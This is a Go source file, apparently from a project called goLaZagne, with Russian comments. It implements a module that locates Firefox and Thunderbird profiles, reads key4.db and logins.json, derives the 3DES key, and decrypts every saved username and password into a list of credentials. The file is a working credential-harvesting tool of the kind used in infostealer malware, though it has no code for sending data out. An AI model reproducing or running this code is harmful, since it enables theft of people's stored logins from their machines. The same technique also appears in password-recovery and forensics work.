package browsers

import (
	"os"
	"goLaZagne/common"
	"bufio"
	"strings"
	"log"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"encoding/asn1"
	"crypto/sha1"
	"crypto/hmac"
	"crypto/des"
	"crypto/cipher"
	"bytes"
	"io/ioutil"
	"encoding/json"
	"encoding/base64"
	"encoding/binary"
	"sort"
	"encoding/hex"
)

var (
	mozillaPathsUserData = []AppInfo{
		{"FF", common.AppData+"\\Mozilla\\Firefox"},
		{"TB", common.AppData+"\\Thunderbird"},
	}
)

type AppInfo struct{
	name string
	path string
}

//Структуры для asn1.Unmarshal
type AsnSourceDataMasterPassword struct {
	Data struct{
		ObjIdent asn1.ObjectIdentifier
		Data struct{
			Entry []byte
			P int
		}
	}
	EncryptedPasswdCheck []byte
}

type AsnLoginData struct {
	KeyId []byte
	SomeInfo struct{
		ObjIdent asn1.ObjectIdentifier
		Lv       []byte
	}
	CipherText []byte
}

//Хранение логинов
type MozillaLogins struct {
	Logins []struct {
		Hostname            string      `json:"hostname"`
		EncryptedUsername   string      `json:"encryptedUsername"`
		EncryptedPassword   string      `json:"encryptedPassword"`
	} `json:"logins"`
}

//Структура для хранения зашифрованных логинов/паролей с IV
type decodedLogindata struct {
	keyId []byte
	Iv []byte
	cipherText []byte
}

//Расшифрованные данные для передачи
type mozillaLoginData struct {
	userName decodedLogindata
	passWord decodedLogindata
	hostname string
}

//Считаем hmac
func calculateHmac(key, message []byte) []byte{
	var hm = hmac.New(sha1.New, key)
	hm.Write(message)
	return hm.Sum(nil)
}

//Декодирование 3DES
func tripleDesDecrypt(crypted, key, iv []byte) []byte {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(crypted))
	blockMode.CryptBlocks(origData, crypted)
	return origData
}

//Собираем данные и декодируем 3DES
func mozillaDecrypt3DES(globalSalt, master_password string, entrySalt, encryptedPasswd []byte) []byte{
	var (
		hp = sha1.Sum([]byte(globalSalt)) //Всё верно
		count = 20 - len(entrySalt)
		adder []byte
	)
	for i:=0; i<count; i++{ adder = append(adder, 0x00) }
	var (
		pes = append(entrySalt, adder...)
		chp = sha1.Sum(append(hp[:], entrySalt...)) //Верно
		k1 = calculateHmac(chp[:], append(pes, entrySalt...))
		tk = calculateHmac(chp[:], pes)
		k2 = calculateHmac(chp[:], append(tk, entrySalt...))

		k = append(k1, k2...)
		iv = k[len(k)-8:]
		key = k[:24]

		data = tripleDesDecrypt(encryptedPasswd, key, iv)
	)
	return data
}

//Проверка правильности данных
func mozillaIsMasterPasswordCorrect(item1, item2 string) (string, string, string){
	/*
	SEQUENCE {
		SEQUENCE {
			OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
			SEQUENCE {
				OCTETSTRING entry_salt_for_passwd_check
				INTEGER 01
			}
		}
		OCTETSTRING encrypted_password_check
	}
	*/

	var sourceData AsnSourceDataMasterPassword
	var _, err1 = asn1.Unmarshal([]byte(item2), &sourceData)
	if err1!=nil{
		log.Println(err1.Error())
	}
	var (
		globalSalt = item1
		encryptedPasswordCheck = sourceData.EncryptedPasswdCheck
		entrySaltForPasswordCheck = sourceData.Data.Data.Entry
		her=[]byte{0x00, 0x00}
		check = []byte("password-check")
	)
	check = append(check, her...)
	var cleartext = mozillaDecrypt3DES(globalSalt, "", entrySaltForPasswordCheck, encryptedPasswordCheck)
	if bytes.Equal(cleartext, check){
		return "", "", ""
	} else {
		return globalSalt, "", string(entrySaltForPasswordCheck)
	}
}

//Key data - item1, item2
func mozillaManageMasterPassword(item1, item2 string) (string, string, string, bool){
	var globalSalt, masterPassword, entrySalt = mozillaIsMasterPasswordCorrect(item1, item2)
	if globalSalt == "" {
		//log.Println("Master password is used") //TODO Сделать извлечение "сырых" данных для перебора
		//TODO Вставить вывод ошибок
		return "", "", "", false
	}
	return globalSalt, masterPassword, entrySalt, true
}

func mozillaGetLongBE(header []byte, offset int) uint32{
	return binary.BigEndian.Uint32(header[offset:offset+4])
}

func mozillaGetShortLE(header []byte, offset int) uint16{
	return binary.LittleEndian.Uint16(header[offset:offset+2])
}

type offsetsRange []uint16

func (a offsetsRange) Len() int           { return len(a) }
func (a offsetsRange) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }
func (a offsetsRange) Less(i, j int) bool { return a[i] < a[j] }

func mozillaReadBsdDB(path string) map[string]string{
	var readDB, err = os.Open(path)
	if err != nil{
		log.Println(err.Error())
	}
	var buf = make([]byte, 60)
	readDB.Read(buf)
	var magic = mozillaGetLongBE(buf, 0)
	if magic != 0x61561{
		log.Println("Bad magic number")
	}
	var version = mozillaGetLongBE(buf, 4)
	if version != 2{
		log.Println("wrong version")
	}

	var (
		pagesize = mozillaGetLongBE(buf, 12)
		nkeys = mozillaGetLongBE(buf, 0x38)
		readkeys uint32 = 0
		page uint32 = 1
		db1 []string
	)

	for readkeys < nkeys {
		readDB.Seek(int64(pagesize*page), 0)
		var offsets = make([]byte, (nkeys+1)*4+2)
		readDB.Read(offsets)
		var(
			offsetVals offsetsRange
			i           = 0
			nval       uint16 = 0
			val        uint16 = 1
			keys        = 0
		)

		for nval != val{
			keys += 1
			var key = mozillaGetShortLE(offsets, 2 + i)
			val = mozillaGetShortLE(offsets, 4 + i)
			nval = mozillaGetShortLE(offsets, 8 + i)
			offsetVals = append(offsetVals, key + uint16(pagesize*page))
			offsetVals = append(offsetVals, val + uint16(pagesize*page))
			readkeys += 1
			i += 4
		}

		offsetVals = append(offsetVals, uint16(pagesize*(page+1)))
		sort.Sort(offsetVals)

		for i:=0; i < keys*2; i++{
			readDB.Seek(int64(offsetVals[i]), 0)
			var dataBuf = make([]byte, offsetVals[i+1] - offsetVals[i])
			readDB.Read(dataBuf)
			db1 = append(db1, string(dataBuf))
		}
		page += 1
	}

	var db = make(map[string]string)

	for i:=0; i < len(db1); i+=2{
		db[db1[i+1]] = db1[i]
	}
	return db
}

type AsnSecretKeyBSDDB struct{
	Data struct {
		ObjIdent asn1.ObjectIdentifier
		DataSalt struct {
			EntrySalt []byte
			P int
		}
	}
	PrivKeyData []byte
}

type AsnPrivKeyBSDDB struct{
	P int
	Data struct {
		ObjIdent asn1.ObjectIdentifier
		DataNull asn1.RawValue
	}
	OtherData asn1.RawValue
}

type NudeBytesAsnKeyBSDDB struct {
	P1 int
	Keyid asn1.RawValue
	P3 int
	Key asn1.RawValue
	P5 int
	P6 int
	P7 int
	P8 int
	P9 int
}

func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, masterPassword string) []byte{
	var(
		name, _ = hex.DecodeString("f8000000000000000000000000000001")
		privKeyEntry = keyData[string(name)]
		saltLen = int(privKeyEntry[1])
		nameLen = int(privKeyEntry[2])
		privKeyEntryASN1 AsnSecretKeyBSDDB
	)
	asn1.Unmarshal([]byte(privKeyEntry[3+saltLen+nameLen:]), &privKeyEntryASN1)

	var(
		privKeyData = privKeyEntryASN1.PrivKeyData
		entrySalt   = privKeyEntryASN1.Data.DataSalt.EntrySalt
	)
	var privKey = mozillaDecrypt3DES(globalSalt, "", entrySalt, privKeyData)
	var PrivKeyRaw AsnPrivKeyBSDDB
	asn1.Unmarshal(privKey, &PrivKeyRaw)
	var KeyStruct NudeBytesAsnKeyBSDDB // Читаем нужный нам key из sequence
	asn1.Unmarshal(PrivKeyRaw.OtherData.Bytes, &KeyStruct)

	return KeyStruct.Key.Bytes
}

func getMozillaKey(profilePath string, app string) []byte{
	log.Println("Read ", app)

	db, err := sql.Open("sqlite3", profilePath+"\\key4.db")
	if err!=nil{
		return nil
	}
	rows, err := db.Query("SELECT item1, item2 FROM metadata WHERE id = 'password'")
	var item1, item2 string

	for rows.Next(){
		rows.Scan(&item1, &item2)
		var globalSalt, _, _, status = mozillaManageMasterPassword(item1, item2)

		if !status {
			// Сработает в случае использования master password для FF
			return nil
		}

		if globalSalt != ""{
			rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate")
			var all, a102 string
			rows2.Next()
			rows2.Scan(&all, &a102)

			var sourceData AsnSourceDataMasterPassword
			asn1.Unmarshal([]byte(all), &sourceData)

			var entrySalt = sourceData.Data.Data.Entry
			var cipherT = sourceData.EncryptedPasswdCheck
			var key = mozillaDecrypt3DES(globalSalt, "", entrySalt, cipherT)
			return key
		}
	}

	return nil
}

func getFirefoxProfiles(path string) []string{
	fileWithUserData, _ := os.Open(path + "\\profiles.ini")
	scanner := bufio.NewScanner(fileWithUserData)

	var profilesPath []string
	for scanner.Scan(){
		var line = scanner.Text()
		if len(line) < 5 {continue}
		if line[:4] == "Path"{
			profilesPath = append(profilesPath, path+"\\"+strings.Replace(strings.Split(line, "=")[1], "/","\\", 1))
		}
	}
	return profilesPath
}


func mozillaDecodeLoginData(data string) decodedLogindata {
	var nudeData, _ = base64.StdEncoding.DecodeString(data)
	var sourceData AsnLoginData
	asn1.Unmarshal(nudeData, &sourceData)
	var returned = decodedLogindata{sourceData.KeyId, sourceData.SomeInfo.Lv, sourceData.CipherText}

	return returned
}

func mozillaGetLoginData(profile string) []mozillaLoginData {
	_, err := sql.Open("sqlite3",profile+"\\signons.sqlite")
	if err != nil{
		return nil
	}
	var file, errFile = ioutil.ReadFile(profile+"\\logins.json")
	if errFile!=nil{
		return nil
	}

	var logins MozillaLogins
	var LoginsList []mozillaLoginData
	json.Unmarshal(file, &logins)
	for i:=range logins.Logins{
		var (
			encUserName = mozillaDecodeLoginData(logins.Logins[i].EncryptedUsername)
			encPassword = mozillaDecodeLoginData(logins.Logins[i].EncryptedPassword)
			hostname = logins.Logins[i].Hostname
		)
		LoginsList = append(LoginsList, mozillaLoginData{encUserName, encPassword, hostname})
	}
	return LoginsList
}

func mozillaModuleStart(data AppInfo) ([]common.CredentialsData, bool){
	if _, err := os.Stat(data.path); err == nil {
		var profiles= getFirefoxProfiles(data.path)
		for i := range profiles {
			var(
				key = getMozillaKey(profiles[i], data.name)
				credentials = mozillaGetLoginData(profiles[i])
			)
			if len(key) > 24{
				key = key[:24]
			}

			if len(credentials) == 0 || len(key)==0 || key == nil{
				return nil, false
			}
			var credentialsData []common.CredentialsData
			for j := range credentials{
				var (
					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
					passwordWithTrash = tripleDesDecrypt(credentials[j].passWord.cipherText, key, credentials[j].passWord.Iv)
				)
				if len(loginWithTrash) == 0 || len(passwordWithTrash) == 0{
					continue
				}
				var(
					loginLength = len(loginWithTrash)
					passwordLength = len(passwordWithTrash)
					login = string(loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])])
					password = string(passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])])
				)
				if data.name == "TB"{
					credentials[j].hostname="mail"
				}
				credentialsData = append(credentialsData, common.CredentialsData{credentials[j].hostname, login, password})
			}
			return credentialsData, true
		}
	}
	return nil, false
}

func MozillaExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false,Result.Data}

	for i:=range mozillaPathsUserData {
		if _, err := os.Stat(mozillaPathsUserData[i].path); err == nil {
			var data, success = mozillaModuleStart(mozillaPathsUserData[i])
			if success{
				Result.Data = append(Result.Data, data...)
			}
		}
	}
	if len(Result.Data) == 0{
		return EmptyResult
	} else {
		Result.Success = true
		return Result
	}
}